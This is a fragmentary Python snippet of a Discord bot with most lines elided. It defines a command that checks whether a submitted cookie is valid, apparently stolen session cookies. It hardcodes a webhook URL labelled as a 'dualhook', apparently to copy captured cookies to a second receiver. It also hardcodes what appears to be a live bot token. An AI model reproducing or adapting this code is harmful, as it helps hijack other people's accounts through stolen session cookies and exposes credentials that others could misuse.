...
wh = 'https://discordapp.com/api/webhooks/939315462775378011/jSg-f-r1UrJ3IaycL2fZUUG972kxF-WE3BnxFbvVp24YBvZQXHvRrmt6NgdQ0QF6J88r' #enter ur dualhook here
...
async def check(ctx, cookie):
  ...
  if check.status_code ==200: #if valid..
    ...
    e.set_author(name='Bot made by Created#4807')
    ...
    e.set_footer(text='.help to invite Created to your server')
...
client.run('OTQ2NzEzOTUxODM0NjExODAz.YhiuEw.9du5CEL1UIVjo3g5gQKFJeIF-Q4') #replace with your bot token
